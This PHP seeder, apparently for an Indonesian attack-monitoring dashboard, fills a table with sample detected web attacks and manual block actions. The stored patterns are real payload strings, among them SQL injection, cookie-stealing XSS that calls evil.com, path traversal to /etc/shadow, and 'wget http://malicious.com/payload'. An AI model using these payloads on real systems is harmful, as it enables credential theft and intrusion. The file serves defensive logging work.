<?php

namespace Database\Seeders;

use App\Models\AttackLog;
use Carbon\Carbon;
use Illuminate\Database\Seeder;

class AttackLogSeeder extends Seeder
{
    public function run(): void
    {
$kategoriList = ['SQL Injection', 'XSS', 'Path Traversal', 'Brute Force', 'Lainnya'];
        $riskLevels = ['Low', 'Medium', 'High', 'Critical'];
        $actions = ['Allowed', 'Logged', 'Blocked', 'Dropped'];
        $endpoints = ['/login', '/api/data', '/admin', '/cpanel', '/wp-admin', '/api/users', '/search', '/index.php', '/db/admin', '/config.php'];
        $origins = ['Jakarta', 'Surabaya', 'Banjarmasin', 'Bandung', 'Medan', 'Makassar', 'Luar Negeri', 'Unknown'];

        $ipPools = [
            '192.168.1.', '10.0.0.', '172.16.0.',
            '103.10.0.', '36.70.', '114.120.',
            '180.240.', '202.150.', '125.160.',
        ];

        $data = [
            // ========== DATA AWAL ==========
            // SQL Injection (4 data)
            [
                'ip_address' => '103.86.54.12',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'UNION SELECT',
                'endpoint' => '/products',
                'origin' => 'Indonesia',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '45.143.221.9',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'OR 1=1',
                'endpoint' => '/login',
                'origin' => 'Russia',
                'risk_level' => 'Critical',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '218.92.0.115',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'DROP TABLE users',
                'endpoint' => '/search',
                'origin' => 'China',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '197.210.76.41',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'WAITFOR DELAY',
                'endpoint' => '/api/products',
                'origin' => 'Nigeria',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],

            // XSS (3 data)
            [
                'ip_address' => '185.165.29.101',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '<script>alert("XSS")</script>',
                'endpoint' => '/contact',
                'origin' => 'Netherlands',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '5.188.62.7',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'javascript:alert',
                'endpoint' => '/search',
                'origin' => 'Russia',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '36.67.250.44',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'onerror=',
                'endpoint' => '/profile',
                'origin' => 'Indonesia',
                'risk_level' => 'Low',
                'action_taken' => 'Allowed',
            ],

            // Path Traversal (2 data)
            [
                'ip_address' => '178.62.101.74',
                'kategori' => 'Path Traversal',
                'pola_terdeteksi' => '../etc/passwd',
                'endpoint' => '/download',
                'origin' => 'United Kingdom',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '177.53.148.89',
                'kategori' => 'Path Traversal',
                'pola_terdeteksi' => '..\\..\\windows\\system32\\cmd.exe',
                'endpoint' => '/public/files',
                'origin' => 'Brazil',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],

            // Brute Force / Scanning (4 data)
            [
                'ip_address' => '104.248.135.22',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => 'wp-login.php',
                'endpoint' => '/wp-login.php',
                'origin' => 'United States',
                'risk_level' => 'Medium',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '128.199.209.56',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => '.env',
                'endpoint' => '/.env',
                'origin' => 'Singapore',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '82.102.21.145',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => 'phpmyadmin/',
                'endpoint' => '/phpmyadmin/',
                'origin' => 'Ukraine',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '139.59.121.167',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => 'xmlrpc.php',
                'endpoint' => '/xmlrpc.php',
                'origin' => 'India',
                'risk_level' => 'Low',
                'action_taken' => 'Allowed',
            ],

            // RCE & Lainnya (4 data)
            [
                'ip_address' => '47.88.221.186',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'eval(base64_decode())',
                'endpoint' => '/api/execute',
                'origin' => 'China',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '185.234.14.77',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'cmd.exe /c dir',
                'endpoint' => '/debug',
                'origin' => 'Germany',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '202.51.107.22',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'wget http://malicious.com/payload',
                'endpoint' => '/cgi-bin/upload',
                'origin' => 'Indonesia',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '94.130.22.185',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'base64_decode("c3lzdGVt")',
                'endpoint' => '/admin',
                'origin' => 'Czech Republic',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],

            // ========== DATA TAMBAHAN ==========
            // --- XSS (7 data) ---
            [
                'ip_address' => '203.0.113.1',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '<img src=x onerror=alert(1)>',
                'endpoint' => '/gallery',
                'origin' => 'United States',
                'risk_level' => 'Critical',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '198.51.100.2',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'javascript:document.location="http://evil.com"',
                'endpoint' => '/redirect',
                'origin' => 'Canada',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '192.0.2.3',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '<svg onload=alert(1)>',
                'endpoint' => '/comment',
                'origin' => 'Germany',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '203.0.113.4',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'alert(1) //',
                'endpoint' => '/search',
                'origin' => 'Indonesia',
                'risk_level' => 'Low',
                'action_taken' => 'Allowed',
            ],
            [
                'ip_address' => '198.51.100.5',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '"><script>fetch("http://evil.com?cookie="+document.cookie)</script>',
                'endpoint' => '/profile',
                'origin' => 'Japan',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '192.0.2.6',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'document.write("<img src=\'http://evil.com/?"+document.cookie+"\'">)',
                'endpoint' => '/feedback',
                'origin' => 'Brazil',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '203.0.113.7',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '"><body onload=alert(1)>',
                'endpoint' => '/post',
                'origin' => 'France',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],

            // --- SQL Injection (6 data) ---
            [
                'ip_address' => '198.51.100.10',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' UNION SELECT null, username, password FROM users--",
                'endpoint' => '/login',
                'origin' => 'Russia',
                'risk_level' => 'Critical',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '192.0.2.11',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "'; DROP TABLE sessions; --",
                'endpoint' => '/api/logout',
                'origin' => 'China',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '203.0.113.12',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' OR '1'='1' /*",
                'endpoint' => '/admin',
                'origin' => 'India',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '198.51.100.13',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "1; WAITFOR DELAY '0:0:10'--",
                'endpoint' => '/products',
                'origin' => 'United Kingdom',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '192.0.2.14',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' AND SLEEP(5) AND '1'='1",
                'endpoint' => '/search',
                'origin' => 'Australia',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '203.0.113.15',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' OR 1=1 INTO OUTFILE '/tmp/out' --",
                'endpoint' => '/export',
                'origin' => 'Netherlands',
                'risk_level' => 'Low',
                'action_taken' => 'Logged',
            ],

            // --- Path Traversal Critical (1 data) ---
            [
                'ip_address' => '198.51.100.20',
                'kategori' => 'Path Traversal',
                'pola_terdeteksi' => '../../../../etc/shadow',
                'endpoint' => '/download',
                'origin' => 'Ukraine',
                'risk_level' => 'Critical',
                'action_taken' => 'Blocked',
            ],

            // --- Lainnya Critical (1 data) ---
            [
                'ip_address' => '203.0.113.25',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'cmd.exe /c whoami',
                'endpoint' => '/cgi-bin/exec',
                'origin' => 'North Korea',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
        ];

        // Add timestamps to predefined data
        foreach ($data as &$row) {
            $date = Carbon::now()->subDays(rand(0, 29))->subHours(rand(0, 23))->subMinutes(rand(0, 59));
            $row['created_at'] = $date;
            $row['updated_at'] = $date;
        }
        unset($row);

        // Generate 200 sample records spanning the last 30 days
        for ($i = 0; $i < 200; $i++) {
            $date = Carbon::now()->subDays(rand(0, 29))->subHours(rand(0, 23))->subMinutes(rand(0, 59));

            $kategori = $kategoriList[array_rand($kategoriList)];

            // Map pola_terdeteksi based on kategori
            switch ($kategori) {
                case 'SQL Injection':
                    $pola = collect(["' OR '1'='1", "UNION SELECT *", "DROP TABLE users", "'; DROP TABLE", "1=1--", "' UNION SELECT", "admin'--", "OR 1=1"])->random();
                    break;
                case 'XSS':
                    $pola = collect(["<script>alert(1)</script>", "javascript:alert(1)", "onerror=alert(1)", "<img src=x onerror=alert(1)>", "document.cookie", "<iframe src=javascript:alert(1)>"])->random();
                    break;
                case 'Path Traversal':
                    $pola = collect(["../../../etc/passwd", "..\\..\\windows\\system32", "%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd", "..%252f..%252f"])->random();
                    break;
                case 'Brute Force':
                    $pola = collect(["wp-login.php", ".env", "phpmyadmin/", "/admin/", "xmlrpc.php", "wp-admin", "config.php.bak"])->random();
                    break;
                default:
                    $pola = collect(["eval(base64_decode(", "cmd.exe /c", "wget http://", "system('id')", "passthru(", "base64_decode("])->random();
            }

            $riskLevel = $riskLevels[array_rand($riskLevels)];
            $action = ($riskLevel === 'Critical' || $riskLevel === 'High')
                ? collect(['Blocked', 'Dropped'])->random()
                : collect(['Allowed', 'Logged'])->random();

            // Make some IPs repeat for realistic patterns
            $ipBase = $ipPools[array_rand($ipPools)];
            $ip = rand(0, 1) ? $ipBase . rand(1, 255) : rand(1, 223) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 254);

            $data[] = [
                'ip_address' => $ip,
                'kategori' => $kategori,
                'pola_terdeteksi' => $pola,
                'endpoint' => $endpoints[array_rand($endpoints)],
                'origin' => $origins[array_rand($origins)],
                'risk_level' => $riskLevel,
                'action_taken' => $action,
                'created_at' => $date,
                'updated_at' => $date,
            ];
        }

        // Batch insert all records
        foreach (array_chunk($data, 50) as $chunk) {
            AttackLog::insert($chunk);
        }

        // Also add some sample manual actions
        if (\App\Models\ManualAction::count() === 0) {
            \App\Models\ManualAction::create([
                'ip_address' => '103.10.0.45',
                'action_type' => 'block',
                'reason' => 'Terdeteksi melakukan brute force pada halaman login',
                'created_at' => Carbon::now()->subDays(2),
                'updated_at' => Carbon::now()->subDays(2),
            ]);
            \App\Models\ManualAction::create([
                'ip_address' => '180.240.12.78',
                'action_type' => 'drop',
                'reason' => 'Scanning port berulang pada server database',
                'created_at' => Carbon::now()->subDays(1),
                'updated_at' => Carbon::now()->subDays(1),
            ]);
            \App\Models\ManualAction::create([
                'ip_address' => '192.168.1.50',
                'action_type' => 'whitelist',
                'reason' => 'IP internal server farmasi - false positive',
                'created_at' => Carbon::now()->subHours(6),
                'updated_at' => Carbon::now()->subHours(6),
            ]);
        }
    }
}
